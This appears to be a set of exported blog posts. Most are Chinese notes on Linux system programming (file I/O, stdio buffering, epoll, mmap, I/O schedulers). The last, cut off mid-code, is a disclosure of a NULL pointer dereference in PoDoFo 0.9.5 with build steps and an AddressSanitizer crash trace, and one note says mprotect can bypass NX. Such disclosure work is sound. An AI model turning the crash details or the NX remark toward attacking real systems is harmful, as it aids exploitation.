每个进程一开始启动默认打开的三个文件描述符，0表示标准输入，1表示标准输出，2表示标准错误；因此我们打开一个文件，文件描述符一般都是从3开始。 文件的概念，既包括普通文件，也用于访问设备文件、管道、目录等等。遵循一切皆文件的理念，任何能够读写的东西都可以用文件描述符来访问。 关于子进程，默认会从父进程获得一份打开文件表的拷贝；子进程中文件的变化不会影响父进程(拷贝的目的? 为了效率?) 打开文件打开文件包括打开已有文件以及打开不存在的文件（即创建文件）。返回值是文件描述符，失败的话返回-1.比较重要的2点： 若新建文件，那么这个文件所属启动该进程的用户；用户组的话存在两个标准，详细可查看相关资料。 新建文件，涉及到权限问题，在打开的接口中设置。两个接口函数，open、creat(注意没有e zZ…)1234567#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int open (const char *name, int flags);int open (const char *name, int flags, mode_t mode);int creat (const char *name, mode_t mode);相关可以查看手册说明，需要注意的是creat创建新的文件和open创建没有区别；mode表示的设置新建文件权限，只有在新建文件时才生效。 读文件读文件是常见的接口，read12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t len);其中fd就是文件描述符了，要读哪个文件就传入该文件的描述符即可了。我们比较常用的是0，也就是从shell命令行中输入了，对应于前面的介绍，0就是标准输入。len为最大长度，试了一下若len为0或者负数的话就直接结束了，不会阻塞等待输入。关于阻塞和非阻塞，我们比较常见的是阻塞了，也是默认的情况，就是一直挂起直到read结束或者错误产生；非阻塞就相反了。一般判断read的状态就通过返回值了，书上对可能的结果描述的很详细；总结几点就是： 常见的话，就返回实际读入的长度 错误返回-1，具体错误信息需要进一步判断 返回0，标志着EOF，没有可读的数据了 写文件写文件常用的就是write了12#include &lt;unistd.h&gt;ssize_t write (int fd, const void *buf, size_t count);和read类似了，只是我们常用的fd为1，也就是标准输出了。write写入文件的话，最终是写入磁盘；值得一提的是，为了提高处理效率，内核会将需要写入的数据复制到内核缓冲区中，然后等到空闲或者其他条件满足时，将多个缓冲区的数据一并写入磁盘中。也称为延迟写入。这样既保证了程序执行的效率，即调用write就能够快速执行结束；同时下一次调用read读取写入的数据时可以不用从磁盘中读取，而是直接从缓冲区读入。当然也存在风险，在写入磁盘前系统崩了，数据就丢失了。 I/O 同步主要是对针对前面的write操作，因为write默认是将数据放在内核缓冲区中，并不写入磁盘之中。当然有些需求可能需要数据实时同步到磁盘中，尤其是一些很重要的数据；这里的话Linux也提供了相应的操作选项。 针对单个文件同步接口123#include &lt;unistd.h&gt;int fsync (int fd);int fdatasync (int fd);这两个接口函数用于对指定文件进行一次同步，即将fd对应的缓冲区数据写入磁盘之中。区别在于fsync将所有数据写入，fdatasync仅写入普通数据，并不包括元数据(任何文件系统中的数据包括两部分，一是普通数据，一是元数据，简单描述为普通数据就是文件中的实际数据，元数据就是描述文件特征的系统数据。详细参考http://www.cnblogs.com/wspblog/p/4967339.html)。调用成功返回0，失败返回-1.上面是对单个文件的，当然也有对全部文件的，即将所有缓冲区(暂存文件数据的)中数据同步到磁盘 针对所有文件同步接口12#include &lt;unistd.h&gt;void sync (void);当然除了接口之外，在打开文件时也可以通过设置参数来实现同步 通过设置参数12//O_SYNC fd = open (file, O_WRONLY | O_SYNC);O_SYNC标志打开文件使得所有在该文件上的I/O操作都会同步到磁盘O_DSYNC 和 O_RSYNC标志，O_DSYNC标志使用普通数据会同步，元数据不同步；O_RSYNC标志要求读操作像写操作一样同步(当然主要是元数据，比如最后打开文件的时间更新之类的，因为读文件并不会修改基本数据……)。 直接I/O有时候用户并不需要内核的I/O管理，而是倾向于实现一套属于自己的I/O管理。在open中使用O_DIRECT标志会使内核最小化I/O管理的影响。使用该标志，I/O操作将会忽略页缓存机制，直接对用户空间缓冲区和设备进行初始化。所有I/O将是同步的，操作在完成之前不会返回。 关闭文件常用的close接口12#include &lt;unistd.h&gt;int close (int fd);执行成功返回0，失败返回-1 lseek查找1234#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;off_t lseek (int fd, off_t pos, int origin);相关参数定义参考：http://www.cnblogs.com/ly01/p/4597926.html该接口主要是为了满足在指定位置读写的需求。这么说吧，假设我们调用read函数进行读取数据，read (int fd, void *buf, size_t len); 其中传入的是一个文件标识符fd，用于找到文件；其实这中间还隐藏了另一个参数，那就是文件偏移，默认我们的操作偏移都是0，所以我们打开文件然后读取就会从文件的开始之处读，而lseek就是为了改变这个偏移值，使得从指定的位置开始读入。写了一个小例子，其中1234.txt中的内容为12345678901234567891011121314151617#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(){ char buf[100] ; int fd = open(&quot;1234.txt&quot;, O_RDWR) ; off_t t = lseek(fd, 5, SEEK_CUR) ; read(fd, buf, 1) ; printf(&quot;%s\\n&quot;, buf) ; return 0 ;}设置了偏移为当前位置偏移5，那就是开始读入为6，因此输出为6.这是一种方式，但是已经改变了文件偏移，另外两个接口就是直接指定位置读写，而且不会改变原始偏移123#include &lt;unistd.h&gt;ssize_t pread (int fd, void *buf, size_t count, off_t pos);ssize_t pwrite (int fd, const void *buf, size_t count, off_t pos);pos是绝对偏移 文件截断就是把一个指定文件设置为指定长度，长了截断，短了补012345#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int ftruncate (int fd, off_t len);int truncate (const char *path, off_t len);两个接口，一个操作一个可写的fd，一个直接操作文件路径 I/O多路复用 (IO multiplexing)正常情况下我们要进行多个I/O操作的时候，比如说read，阻塞等待数据到来；一种很常规的方法就是多线程监听等待数据。I/O多路复用说简单点就是使用一个进程来对多个I/O进行管理，基本原理是该进程不断查询所负责I/O，当某个I/O有数据达到时，就通知用于进程进行处理。对该方法的实现，提供了3个接口：select、poll、epoll，这个接口也是依次优化。这种方法常用于WebServer的处理，一般都要处理不同用户的请求，如nginx中使用了epoll。简单介绍参考：https://segmentfault.com/a/1190000003063859#articleHeader9详细描述参考：https://www.zhihu.com/question/32163005 （包含对三个接口的比较） 内核内幕这部分主要介绍Linux内核是如何实现I/O的** 虚拟文件系统 (VFS) **可以看成是对不同文件系统(如NTFS等)的一个封装，然后提供接口给上层程序员调用；程序员不需要关心文件所在的文件系统或者介质，通过统一接口处理即可。** 页缓存 **简单说是利用局部性原理，将最近访问的数据存入到内存之中，提高下一次的访问速率（当然是基于假设最近访问的数据再次访问的概率较大）** 页回写 **也就是前面write中的延迟写，满足以下条件时会将内存中的数据写入磁盘： 当空闲内存小于设定的阈值时 当一个脏的缓冲区(存储将要写入磁盘中数据的缓冲区称之为脏缓冲区)寿命超过设定的阈值时回写入磁盘由pdflush内核线程操作，当出现上述条件之一，pdflush线程将被唤醒，并开始回写。","link":"/2017/09/21/Linux-System-Programming-1/"},{"title":"Linux 系统编程导读 - 缓冲输入输出","text":"简介本章主要介绍C所提供的标准I/O操作。不同于前面的open只能在Linux上被支持，C标准接口能够在不同系统中被支持。两个基本的概念，关于底层的I/O操作，效率问题。 磁盘，读写最下层就是磁盘的操作。所有的磁盘操作都是基于块进行，这句话的意思就是如果跨越块进行读写会导致效率降低，因此读写请求若选择块大小的整数倍和约数倍的话，就能够保证不会出现跨越块进行读写的问题。 内存，常听到的内存对齐问题。CPU进行读写数的时候，对于32位的机器，一次读取写入4字节，并且是按照起始地址开始的，例如CPU要读取一个值时，它只会从4的倍数的地址进行读写，只会读取0，4，8这些地址（起始地址为0）。因此内存对齐的好处是，假设我们要读一个4字节的值，地址在0x5，那么CPU就要先读0x4，取出3字节；然后再读0x8，取出1字节，相当于进行了两次操作，严重影响效率；对齐的话，就能够保证不会产生多余的操作。 而C的接口默认优化了这些问题，内存对齐一般编译器会优化好。** 其他 **：分区对齐：将分区的起始位置放在扇区的0处，这样才能保证每一个block都在单独的一个扇区中，一个扇区中包含多个block，若不对齐，那么将会导致一个block跨越两个扇区，严重影响速度。 用户缓冲I/O用户缓冲I/O的作用类似于内核的缓冲区，在用户空间设置输入输出的缓冲区，目的也是为了提供I/O效率。标准I/O不同于系统I/O，它使用的不是文件描述符操作，而是文件指针，也就是”流”，最常见的是标准输入输出流，stdin和stdout，对应于文件描述符0和1。 打开文件返回的是文件指针，也就是 “流”，下面的接口也是最常用：12#include &lt;stdio.h&gt;FILE* fopen(const char * path, const char * mode);因为文件描述符和流是对应的，因此也可以由文件描述符转化为 流：12#include &lt;stdio.h&gt;FILE * fdopen (int fd, const char *mode);两者将会关联，通过一个修改就会影响另一个的操作。模式必须匹配。 关闭流最常用的就是fclose了：12#include &lt;stdio.h&gt;int fclose (FILE *stream);关闭所有和当前进程相关的流接口：123#define _GNU_SOURCE#include &lt;stdio.h&gt;int fcloseall (void);该函数是Linux特有的。 从流中读取数据单字节读取12#include &lt;stdio.h&gt;int fgetc (FILE *stream);从流中读取下一个字符，并将该无符号字符强转为int返回。 将字符放在流中12#include &lt;stdio.h&gt;int ungetc (int c, FILE *stream);类似于一个栈，后放入先被读出，一个简单的例子能够很好的表示：123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;/*http://c.biancheng.net/cpp/html/269.html*/int main(){ char c ; while( (c = getchar()) != EOF &amp;&amp; isdigit(c) ) { printf(&quot;%c &quot;, c) ; } ungetc(c, stdin) ; ungetc(&apos;c&apos;, stdin) ; printf(&quot;%c \\n&quot;, getchar()) ; return 0 ;}123icepng@ubuntu:~$ ./test 12345qwe1 2 3 4 5 c 按行读取读取一个字符串12#include &lt;stdio.h&gt;char * fgets (char *str, int size, FILE *stream);从流中最多读取size-1个字节，并存入str中。当所有字节读入时，空字符会被存入字符串末尾。当读到EOF或换行符时读入结束，若读到一个换行符，则将”\\n”存入。也就是说最后一个会放入’\\0’。例如：1234567891011#include &lt;stdio.h&gt;int main(){ char c[10] ; fgets(c, 10, stdin) ; if( c[5] == &apos;\\0&apos; ) puts(&quot;yes&quot;) ; return 0 ;}123icepng@ubuntu:~$ ./test 1234yes可以得知，c[0-3]存入1-4，c[4]存入’\\n’，c[5]存入’\\0’。 读取二进制文件12#include &lt;stdio.h&gt;size_t fread (void *buf, size_t size, size_t nr, FILE *stream);从流中读入 nr个数据，每个数据size个字节。返回读入元素的个数。 向流中写数据和读对应的一些接口 写入单个字符12#include &lt;stdio.h&gt;int fputc (int c, FILE *stream); 写入字符串12#include &lt;stdio.h&gt;int fputs (const char *str, FILE *stream); 写入二进制数据12#include &lt;stdio.h&gt;size_t fwrite (void *buf, size_t size, size_t nr, FILE *stream); 定位流目的是用于指定位置读写12#include &lt;stdio.h&gt;int fseek (FILE *stream, long offset, int whence);类似于系统I/O中的lseek，偏移也是由whence和offset共同决定的。成功返回0，失败返回-1。fsetpos函数则用于直接定位到指定位置：12#include &lt;stdio.h&gt;int fsetpos (FILE *stream, fpos_t *pos);rewind函数用于重置流到初始位置：12#include &lt;stdio.h&gt;void rewind (FILE *stream);ftell用于返回当前流的位置：12#include &lt;stdio.h&gt;long ftell (FILE *stream);类似功能的接口为fgetpos，用于获取流的当前位置，并写入pos中：12#include &lt;stdioh.h&gt;int fgetpos (FILE *stream, fpos_t *pos);参考：http://www.runoob.com/cprogramming/c-function-fgetpos.html 清洗一个流即将用户缓冲区的数据写入到内核之中。12#include &lt;stdio.h&gt;int fflush (FILE *stream); 错误与文件结束一些接口在遇到文件结束EOF和发生错误时返回的一样，如fread等。用于测试是否在流中设置了错误标志的ferror：12#include &lt;stdio.h&gt;int ferror (FILE *stream);测试文件结束标志是否设置的feof：12#include &lt;stdio.h&gt;int feof (FILE *stream);为流清空错误和文件结尾标志的clearerr；12#include &lt;stdio.h&gt;void clearerr (FILE *stream); 获得关联的文件描述符由流获取到文件描述符，和fdopen正好是相反的功能：12#include &lt;stdio.h&gt;int fileno (FILE *stream);返回和流关联的文件描述符，失败时返回-1. 控制缓冲即对用户缓冲区的控制，可以设置为不缓冲、行缓冲、块缓冲行缓冲：在每次遇到换行符，缓冲区将被提交给内核缓冲区。（标准输出stdout，即屏幕输出，默认是行缓冲）块缓冲：默认所有和文件相关的流都是块缓冲。块缓冲又称为全缓冲。12#include &lt;stdio.h&gt;int setvbuf (FILE *stream, char *buf, int mode, size_t size);模式用于设置三种缓冲形式：_IONBF：无缓冲_IOLBF：行缓冲_IOFBF：块缓冲buf指向一个size大小的缓冲区空间。无缓冲模式不考虑。如果buf为空，缓冲区则有glibc自动分配。成功时返回0，不成功返回非0.注意：在流关闭前，缓冲区必须存在，有时候设置buf为局部变量在作用域结束后导致缓冲区销毁；需注意在之前关闭流。 其他标准C多线程访问，本质上是线程安全的，即多线程访问，默认会加锁处理。也可以人为加锁。","link":"/2017/10/02/Linux-System-Programming-2/"},{"title":"Linux 系统编程概述","text":"概述，也就是简单描述每一章所包含的内容，可以能够快速了解到Linux系统编程中所包含的内容。 简介和主要概念对应书中的第一章，介绍的是整体内容以及一些概念；整体内容包括文件的操作(I/O); 进程; 内存; 信号; 时间。 文件I/O的概念如何在程序中访问到文件？通过文件描述符；而通过文件描述符索引到的是一个inode标识，然后通过inode直接关联到实际的文件。但是通过inode来访问对用户来说并不是很方便，毕竟inode只是一个整数值，并不能直观的对应到文件；所以此时就建立了一张表，将文件名和inode进行映射，那么我们就可以通过文件名来访问到inode从而访问到文件了，这就是目录和映射的概念。 其他其他像进程线程，用户权限等只挑了几个关键的概念介绍了下。详见： 简介 文件I/O文件I/O 这章介绍I/O的一些基本概念，包括从打开文件、读写文件、关闭文件；因为为了减少写入磁盘的次数，引入的延迟写入的机制，当然也将提供接口使得数据一次写入，那就是同步I/O；不依赖于Linux系统提供的I/O机制，也就是直接I/O了。默认是在文件起始位置进行读写，若需要指定位置读写，就可以使用lseek等接口了；还有截断文件到指定长度的truncate、ftruncate以及I/O多路复用接口select、poll、epoll；最后介绍了内核对文件I/O的三个机制，包括虚拟文件系统、页缓存、页回写，主要是为了提高好的封装型以及高效性而设计。详见： 文件I/O 缓冲输入输出这一章介绍的就是C提供给I/O接口，对于Linux系统I/O接口的一个封装，能够更简单的满足各种读写要求（如读取一个字符串，写入一个字符串等）；前面提到Linux系统I/O接口将文件作为一个文件描述符来进行处理，而这里的C接口将文件作为流进行处理，并且和文件描述符是对应的。关于这章为啥叫缓冲输入输出，我的理解是C的接口会维护一个单独I/O缓冲区，然后再与系统缓冲区进行交互。详见： 缓冲输入输出 高级文件I/O这一章提供一些更加高级的I/0系统调用，包括： 在一次调用时，同时对多个缓冲区做读取或者写入操作的 散布/聚集 I/O 在一个进程中处理大量文件描述符的 epoll 将文件映射到内存的 内存映射I/O 允许进程将文件I/O使用时的一些提示信息给内核的 文件I/O提示 允许进程发出多个I/O请求但不需要等待的 异步I/O详见：高级文件I/O","link":"/2017/09/27/Linux-System-Programming-Menu/"},{"title":"Linux 系统编程导读 - 高级文件I/O","text":"散布/聚集 I/O目的是在单次系统调用（I/O操作）中操作多个缓冲区。按我们平时的读写操作，** read ** 以及 ** write *，都是将数据读入单个缓冲区，从单个缓冲区中写出。同样也有对应的操作接口：123#include &lt;sys/uio.h&gt;ssize_t readv (int fd, const struct iovec *iov, int count);ssize_t writev (int fd, const struct iovec *iov, int count);都包含三个参数，fd是需要操作的文件；第二个是iovec结构的数组，即缓冲区，第三个指示数量。iovec结构1234struct iovec {void *iov_base;size_t iov_len;};用基址和长度来描述一个缓冲区。读入的数据将放入iov_base~iov_base+iov_len这片内存区域中。segment用来表示一个缓冲区。* 读操作 *：从文件中读入count个segment到 iov指向的缓冲区数组中。* 写操作 **；从iov指向的缓冲区数组中读取count个segment写入到指定的文件中。返回值：读写的字节数，操作成功将返回count个segment的所有iov_len之和 EPOLLEPOLL还是用于在一个进程中同时监控多个文件描述符相关的事件，是相对于POLL和SELECT的优化。最大的优势就是在事件发生后能够知道是与哪一个文件描述符相关的事件，而POLL将需要遍历一次所有文件描述符才能确定是对哪个文件描述符的操作，因此效率很低。下面是关于EPOLL的使用方法： 创建EPOLL12#include &lt;sys/epoll.h&gt;int epoll_create (int size)size仅为通知内核需要监听的文件描述符个数，并不代表是最大值。 控制EPOLL12#include &lt;sys/epoll.h&gt;int epoll_ctl (int epfd, int op, int fd, struct epoll_event *event);* epoll_ctl *用于控制EPOLL实例加入或者删除文件描述符。参数op用于指定需要的操作，包括：123EPOLL_CTL_ADD：增加一个文件描述符操作EPOLL_CTL_DEL：删除一个文件描述符操作EPOLL_CTL_MOD：修改一个文件描述符上监听的事件指定需要监听的事件，epoll_event；123456789struct epoll_event {__u32 events; /* events */union {void *ptr;int fd;__u32 u32;__u64 u64;} data;};events参数指定了需要对文件描述符监听的事件。一个简单的例子，来自书上：12345678struct epoll_event event;int ret;event.data.fd = fd; /* return the fd to us later*/event.events = EPOLLIN | EPOLLOUT;ret = epoll_ctl (epfd, EPOLL_CTL_ADD, fd, &amp;event);if (ret)perror (”epoll_ctl”); 等待EPOLL事件12#include &lt;sys/epoll.h&gt;int epoll_wait (int epfd, struct epoll_event *events, int maxevents, int timeout);* epoll_wait *用于等待EPOLL实例epfd中文件描述符所包含的事件，时限为timeout毫秒（若timeout=0，则立刻返回；timeout=-1则一直等待）。成功返回时，events指向包含epoll_event结构体的内存。失败返回-1。 边沿触发事件和水平触发事件水平触发：默认选项，在状态发生时触发。边沿触发：设置events项为EPOLLE，在状态改变时触发。 存储映射将文件中的内容与内存进行映射，使得访问文件和访问内存一致。12#include &lt;sys/mman.h&gt;void * mmap (void *addr, size_t len, int prot, int flags, int fd, off_t offset);* mmap * 用于将文件fd从offset偏移往后 len个字节内容映射到内存中。prot指示内存的访问权限。flags指示映射的一些行为。当映射一个文件时，其文件描述符引用计数会加1，即映射后关闭文件仍能够访问文件；当取消映射后，文件描述符引用计数会减1调用成功，返回映射区的地址调用失败，返回MAP_FAILED 两个信号SIGBUS，当尝试访问一块无效的映射区域时触发SIGSEGV，当尝试写一块只读区域时触发 页大小页是内存中允许不同权限和行为操作的最小单元。页是内存映射的基本块，也是进程内存空间的基本块。因此 mmap 映射对应的addr和len都需按页对齐，即页的整数倍，对于多余的内存空间用0填充。几种获取页大小的方法：* sysconf * POSIX标准接口1234#include &lt;unistd.h&gt;long sysconf (int name);long page_size = sysconf (_SC_PAGESIZE);* getpagesize * Linux提供的接口，并不是所有的unix系统都支持。12#include &lt;unistd.h&gt;int getpagesize (void);* PAGE_SIZE * 宏定义1int page_size= PAGE_SIZE ; munmap* munmap *用于取消映射12#include &lt;sys/mman.h&gt;int munmap (void *addr, size_t len);成功返回0，失败返回-1。当映射解除之后，之前关联的内存区域不再有效，如果尝试访问将产生 SIGSEGV信号。 调整映射大小 mremap* mremap *是Linux特有的操作Flag的值可以是0或者 MREMAP_MAYMOVE，指定在大小调整时，是否可以移动映射以达到大小调整的目的。1234#define _GNU_SOURCE#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;void * mremap (void *addr, size_t old_size, size_t new_size, unsigned long flags);成功返回新映射区的指针，失败返回MAP_FAILEDglibc基于mremap实现高效的realloc，用于调整malloc所分配的大小 改变映射区权限 mprotect用于改变内存区域的权限，prot可取的值为：PROT_NONE、PROT_READ、PROT_WRITE、PROT_EXEC。Linux下mprotect可以操作任意区域的内存，也就类似于Windows下的VirtualProtect，可以绕过NX12#include &lt;sys/mman.h&gt;int mprotect (const void *addr, size_t len, int prot); 映射机制同步文件 msync用于将映射在内存中的文件写回磁盘，同步内存和文件，addr通常为mmap的返回值flags 控制同步操作的行为：MS_ASYNC：同步操作异步执行MS_INVALIDATE：指定该块映射的其他所有拷贝都将失效，未来对该文件任意映射操作将同步到磁盘MS_SYNC；同步操作同步执行，必须写回磁盘再返回12#include &lt;sys/mman.h&gt;int msync (void *addr, size_t len, int flags);成功返回0，失败返回-1 映射提示让进程在如何访问映射区域上** 给内核一定的提示 **，相当于给内核发送一些提示消息。12#include &lt;sys/mman.h&gt;int madvise (void *addr, size_t len, int advice); 普通文件I/O提示普通文件I/O操作时，** 给内核一定的提示 **两个接口 posix_fadvise 和 readahead(Linux特有)1234#include &lt;fcntl.h&gt;int posix_fadvise (int fd, off_t offset, off_t len, int advice);ssize_t readahead (int fd, off64_t offset, size_t count);一个很使用的场景，当读取一个文件的大部分内容时，可以先通知内核 要进行预读数据，设置POSIX_FADV_SEQUENTIAL，提示要大量预读；若是只读很少的数据，后面没有读操作，那么设置POSIX_FADV_RANDOM提示禁止预读效果会更好。 同步(Synchronized), 同步(Synchronous) 和 异步(Asynchronous)Synchronized 写操作把数据写回硬盘，并确保硬盘上的数据和内核缓冲区中的数据是同步的；Synchronous 写操作保证数据全部写入到内核缓冲区，并不涉及到磁盘 Synchronous 读操作确保数据写道应用程序在用户空间缓冲区(即写入用户缓冲区)Synchronized 确保返回的是最新的数据到变量内存 异步I/OLinux 下的 aio库，用于异步读写等操作接口123456#include &lt;aio.h&gt;int aio_read (struct aiocb *aiocbp);int aio_write (struct aiocb *aiocbp);int aio_error (const struct aiocb *aiocbp);int aio_return (struct aiocb *aiocbp);(......)Linux 只支持使用O_DIRECT标志打开文件上的aio。 I/O调度器 和 I/O性能主要是在对磁盘中数据的访问效率很低，通过一些方式来优化对磁盘的操作。 磁盘寻址硬盘基于 柱面(cylinders)、磁头(heads)、扇区(section)来确定地址，CHS寻址一个硬盘看成是一个圆柱体，可以看成是有多个圆形成，每个圆称之为一个盘片。柱面则是所有与圆中心距离相等的点所组成的一个圆表面。** 寻址 **：柱面确定了一个子圆柱表面；磁头确定了所处的盘片；扇区则确定了该盘片中的确切位置。 调度器的优化调度器的优化包括2个部分： 合并，对一些相邻块的请求，进行合并一次操作 排序，按照块号递增的顺序依次访问磁盘，这样减少了磁盘头的移动距离改善读请求读请求的几种优化算法 Deadline I/O 调度器维护了三个队列，一个标准的队列，是经过排序的I/O等待列表(一般都是按照块号排序)；两个FIFO队列，一个处理读操作，一个处理写操作。当来一个请求后，会首先插入到标准队列中，并依据读写，放在指定的FIFO队列队尾，对于FIFO队列的每一个元素都将设置一个过期时间。一般情况，硬盘总是先从标准队列队头选择一个操作，若FIFO队列头超过了过期时间，将优先处理FIFO队列中的请求。 Anticipatory I/O 调度器该方法是为了优化这么一个情况：当延迟很小的时候，那么就会经常性的出现过期，那么就需要处理FIFO的请求；但是稍微等待一会会有另一个相邻位置的请求存在，那么就可以一起处理节省寻道时间了。其主要思想就是在过期时间到来后，不立马响应而是等待一会，如果在指定时间内收到同一部分的另一次读请求，将立马被响应；若没有响应，则认为预测失败，回归正常操作。 CFQ I/O 调度器CFQ(complete Fair Queuing) 主要是应用于多进程的处理，对于每一个进程提供一个队列。 Noop I/O 调度器只做简单的合并，不做排序操作。 ** 配置I/O调度器 ** 在启动时通过内核参数iosched来指定，有效选项为 as、cfq、deadline和noop；运行时通过下面操作设置。1#echo cfq &gt;/sys/block/hda/queue/scheduler* /sys/block/device/queue/iosched * 目录下包含管理员可以获得和设置的I/O调度器选项。","link":"/2017/10/09/Linux-System-Programming-3/"},{"title":"Linux 系统编程导读 - 简介","text":"说是Linux系统编程一书的导读，其实只是对Linux系统编程的学习笔记吧。系统编程其实说到底就是借用操作系统所提供的API进行一些底层功能性的操作，并在使用的过程中尽可能去了解其工作的原理。看了一下目录，主要分为以下几个部分：文件的操作(I/O); 进程; 内存; 信号; 时间。也就主要分为这几个部分来学习学习。尽可能使用简短的语言以及实际的例子来描述。 简介按照 1.4 Linux编程概念来描述 文件文件描述符fd，我们平时在使用Linux C的open函数来打开一个文件的时候，就会返回一个整数值；1int open(const char *path, int oflag, ... );该整数值就是文件描述符了。在使用open打开文件后，就可以通过文件描述符来访问文件了。文件描述符是内核为了高效管理已打开的文件所创建的索引；程序启动时，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。对于用户程序进程来说，每一个进程都会有自己所对应的一个文件描述符表来对文件描述符进行管理。参考：http://blog.csdn.net/cywosp/article/details/38965239 文件描述符怎样和实际文件对应?既然通过一个文件描述符能够访问到文件，那么该文件描述符必须能够对应到实际的文件，很容易想到一种解决方法就是建一个对应的表，索引key就是文件描述符，然后value就是文件，这样就能够很容易形成对应，也能够通过文件描述符访问到实际的文件了。Linux的做法也是类似于这种思想，首先进程会有自己的一个文件描述符表，这个表即表示该进程打开的文件；内核对所有打开的文件建一个统一的表来进行管理（猜测主要是为了对信息相同的打开文件只存储一条记录，减少消耗），进程的文件描述符表指向统一的表，这个统一的打开表会记录打开文件的详细信息，包括打开的方式(W/R)、文件的类型等等；我们比较关心的是包含一个inode指针，指向一个inode表。inode(information node)表中的每条记录，包含一个文件的基础信息，如在磁盘中的位置等，用它来唯一标识一个实体的文件，并通过它来访问到一个实体的文件。 目录和链接用户直接通过inode来访问文件的不方便性，因此引入了 “目录” 的概念，目录用于将访问文件的名字和inode编号进行映射；名字和inode的配对称为链接。当用户请求打开a.txt时，会在文件名指定的目录下面搜索该文件，找到该文件后，对应找到其inode编号，从而得到其inode。该书给了一个例子，当用户请求访问 /home/blackbeard/landscaping.txt时，对应每一个目录（常说的文件夹），也将对应一个inode；那么找到landscaping.txt的顺序为：首先是在根目录 “/“下面搜索，找到home以及对应的inode，跳转到该位置；继续在该目录下搜索blackbeard，找到其对应的inode，跳转；最后在该目录下找到landscaping.txt并索引得到其对应的inode，从而找到文件。这里包括两个概念，假设在一个文件夹下面创建一个文件，那么将会创建一个文件名到inode的映射，称之为链接(link)；删除该文件时将会解除链接，称之为删除链接(unlink)。 硬链接如果需要多个文件名链接到一个数据时，就需要用到硬链接了。这个一般用于保护重要的数据，假设有个重要的数据，我们可以为其创建一个硬链接，然后再去访问，就算误删除了该文件，也可以通过创建的硬链接访问到数据；(ln 1.txt 2.txt #为1.txt创建链接2.txt)硬链接为了支持多个不同的文件名链接到一个inode，即两个不同的文件名，但是指向同一个磁盘数据；那么一个问题就是当删除一个之后，另一个也是能够访问到数据的，所以删除一个之后，不能够执行删除inode；所以inode添加了一个成员变量，链接计数，表示链接到该inode的文件名数量，当为0时就可以删除了。类似于浏览器中常见的引用计数。 软链接(符号链接)类似于常说的快捷方式，它并不是直接链接到实际的inode数据；而是包含另一个文件的位置信息。所以点击符号链接时，首先对其进行解析找到原始文件名的位置，然后再通过该位置找到inode。(ln -s 1.txt symbolicLink)值得一提的是，就算没有1.txt，也是能够创建symbolicLink的，只是在访问的时候，找不到位置下的文件而已。硬链接、软链接详细可参考: http://blog.csdn.net/u013777351/article/details/50557260 特殊文件块设备文件、字符设备文件、命令管道、Unix域套接字 文件系统与命令空间详见：https://www.ibm.com/developerworks/cn/linux/l-linux-filesystem/index.html 进程和线程进程的管理：Linux中进程有一个严格的层次结构，进程树；进程树的第一个进程，init进程为根，新进程通过fork创建，新进程为调用fork的进程的子进程。需要注意的是，如果父进程在子进程前终止，那么内核将指定init进程为其父进程；就是说当父进程结束后，子进程也可以正常执行。如果一个进程终止后，不会立即从系统中移除，内核将在内存中保存进程的部分内容，允许父进程查询该进程是否处于终止的状态，确定终止后才会完全删除。僵尸进程：如果一个进程处于终止状态，但其父进程尚未获知它的状态。 用户、组和权限可以看成用于权限的管理，我们平时使用Linux的时候，对于一个文件或者一个文件夹，在它的属性中能够看到其所属于的用户以及用户组，以便给予相应的权限。12varas@varas-virtual-machine:~$ ls -l ./a.txt -rw-rw-r-- 1 varas varas 0 9月 20 11:37 ./a.txt可以看出，该文件所属于的用户和用户组都是varas，对应于左边的三组权限，分配是用户、用户组、其他用户的权限。进程也有对应的管理，每一个进程与一个用户ID关联，用于识别运行这个进程的用户","link":"/2017/09/18/Linux-System-Programming/"},{"title":"PoDoFo 0.9.5 NULL pointer dereference","text":"PoDoFo 0.9.5 function TextExtractor::ExtractText in TextExtractor.cpp:77 cause a NULL pointer dereference Analyzercode from https://sourceforge.net/p/podofo/code/HEAD/tree/podofo/trunk/ (2017-04-09) compile:12cmake -G &quot;Unix Makefiles&quot; -DCMAKE_INSTALL_PREFIX=/home/icepng/aaaa/ -DCMAKE_BUILD_TYPE=DEBUG -DCMAKE_EXE_LINKER_FLAGS=&quot;-fsanitize=address -fno-omit-frame-pointer&quot; ../make -jand run it:1./podofo-code/podofo/trunk/build/tools/podofotxtextract/podofotxtextract ./PoC Crash Info12345678910111213===================================================================12966==ERROR: AddressSanitizer: SEGV on unknown address 0xbebec0bd (pc 0x080f4c21 bp 0xbf8fcbc8 sp 0xbf8fcbc0 T0) #0 0x80f4c20 in PoDoFo::PdfVariant::DelayedLoad() const /home/icepng/podofo-code/podofo/trunk/podofo/base/../../src/base/PdfVariant.h:545 #1 0x80f4c8f in PoDoFo::PdfVariant::GetReal() const /home/icepng/podofo-code/podofo/trunk/src/base/PdfVariant.h:675 #2 0x80f38af in TextExtractor::ExtractText(PoDoFo::PdfMemDocument*, PoDoFo::PdfPage*) /home/icepng/podofo-code/podofo/trunk/tools/podofotxtextract/TextExtractor.cpp:77 #3 0x80f36a5 in TextExtractor::Init(char const*) /home/icepng/podofo-code/podofo/trunk/tools/podofotxtextract/TextExtractor.cpp:48 #4 0x80f6ceb in main /home/icepng/podofo-code/podofo/trunk/tools/podofotxtextract/podofotxtextract.cpp:52 #5 0xb6a9b636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636) #6 0x80f3470 (/home/icepng/podofo-code/podofo/trunk/build/tools/podofotxtextract/podofotxtextract+0x80f3470)AddressSanitizer can not provide additional info.SUMMARY: AddressSanitizer: SEGV /home/icepng/podofo-code/podofo/trunk/podofo/base/../../src/base/PdfVariant.h:545 PoDoFo::PdfVariant::DelayedLoad() const==12966==ABORTING analysisand the Process is easy, When use podofotxtextract to extract txt info from a pdf file, first extract the input file to a PdfMemDocument object, and then let each page to a PdfContentsTokenizer object, which contained many tokens, and last deal each token. 12345678910111213141516if( eType == ePdfContentsType_Keyword ) { // support &apos;l&apos; and &apos;m&apos; tokens if( 